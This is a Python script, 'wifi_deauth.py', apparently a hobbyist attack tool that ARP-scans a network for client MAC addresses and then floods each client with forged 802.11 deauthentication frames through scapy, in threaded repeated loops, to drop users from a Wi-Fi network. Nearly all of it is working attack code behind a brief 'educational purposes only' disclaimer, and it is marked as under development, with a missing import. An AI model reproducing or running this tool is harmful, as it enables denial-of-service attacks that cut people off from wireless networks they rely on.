'''
Author: Romeos CyberGypsy
Date : 1/2/2020
Module: wifi_deauth.py
Purpose : Deauthenticate users from a wifi network
Status: Under development
'''

###########################
# For educational purposes only.
# I will not be responsible for any misuse of the script
##########################

from scapy.all import *
from scapy.all import ARP, Ether, srp
import optparse
from termcolor import colored
import sys
import threading
import time

class Engine:
    def __init__(self):
        #our constructor function goes here
        self.parser = optparse.OptionParser()
        self.name = colored("Romeos CyberGypsy","blue")
        self.text = colored("[+] Written by ","yellow")
        print("{}{}".format(self.text, self.name))
        print(colored("In case of anything, contact me at lewiswaigwa30@gmail.com","blue"))
        self.parser.add_option("--scan", action = "store_true", help = "Specify you want to scan a network")
        self.parser.add_option("--deauth", action = "store_true", help = "Specify you want to deauthenticate users from the network")
        self.parser.add_option("--target-cidr", dest = "target", help = "Target CIDR to scan")
        self.parser.add_option("--gateway", dest = "gateway", help = "Target MAC Address of gateway from which to deauthenticate  users")
        self.parser.add_option("--interface", dest = "interface", help = "Interface to throw packets e.g wlan0mon")
        self.parser.add_option("--packets", dest = "packets", help = "Number of packets to throw per thread")
        self.parser.add_option("--loop",dest = "loop", help = "Number of times to repeat the attack")

        (self.values, self.keys) = self.parser.parse_args()

        if "--scan" in sys.argv[1]:
            self.scan_network(self.values.target)

        elif "--deauth" in sys.argv[1]:
            #def deauthenticate(self, loop, gateway, packets, interface, mac):
            self.deauthenticate(self.values.loop, self.values.gateway, self.values.packets, self.values.interface)


    def scan_network(self, target):
        #this will scan thr entire network
        #retrieves the users mac addresses and the live hosts
        arp = ARP(pdst = target)
        ether = Ether(dst = "ff:ff:ff:ff:ff:ff") #broadcasting
        #creating our arp packet to broadcast
        packet = ether/arp
        print(colored("[+] Scanning network...{}" .format(target), "blue"))
        results = srp(packet, timeout = 3)[0]

        clients = []
        for sent, received in results:
            clients.append({"ip":received.psrc, "mac":received.hwsrc})

        print(colored("IP Address    :      MAC Address","red"))
        for client in clients:
            print(colored("{}   :   {}" .format(client["ip"], client["mac"]), "green"))

        return clients

    def deauth(self, gateway, packets, interface, mac):
        dot11 = Dot11(addr1 = mac,
                        addr2 = gateway,
                        addr3 = gateway)

        packet = RadioTap()/dot11/Dot11Deauth(reason = 7)
        sendp(packet, inter = 0.1, count = int(packets), iface = interface, verbose = 1)


    def deauthenticate(self, loop, gateway, packets, interface):
        macs = []
        my_ip = subprocess.check_output("ifconfig wlan0", shell = True)
        for client in self.scan_network(self.values.target):
            macs.append(client["mac"])

        loop = int(loop)
        print(colored("[+] Sending deauthentication packets...","red"))
        while loop >= 0:
            for mac in macs:
                thread1 = threading.Thread(target = self.deauth, args = (gateway, packets, interface, mac,))
                thread1.start()
                time.sleep(0.1)

            loop-=1

if __name__ == '__main__':
    banner = '''
        ▖  ▖ ▝   ▗▀  ▝       ▗▖     ▗▄▄     ▗▄▖              ▗  ▐
        ▌▐ ▌▗▄  ▗▟▄ ▗▄       ▐▌     ▐ ▝▌    ▐ ▝▖ ▄▖  ▄▖ ▗ ▗ ▗▟▄ ▐▗▖
        ▘▛▌▌ ▐   ▐   ▐       ▌▐     ▐▄▟▘    ▐  ▌▐▘▐ ▝ ▐ ▐ ▐  ▐  ▐▘▐
        ▐▌█▘ ▐   ▐   ▐       ▙▟     ▐       ▐  ▌▐▀▀ ▗▀▜ ▐ ▐  ▐  ▐ ▐
        ▐ ▐ ▗▟▄  ▐  ▗▟▄     ▐  ▌ ▐  ▐       ▐▄▞ ▝▙▞ ▝▄▜ ▝▄▜  ▝▄ ▐ ▐ '''
    print(colored(banner,"green"))
    obj = Engine()
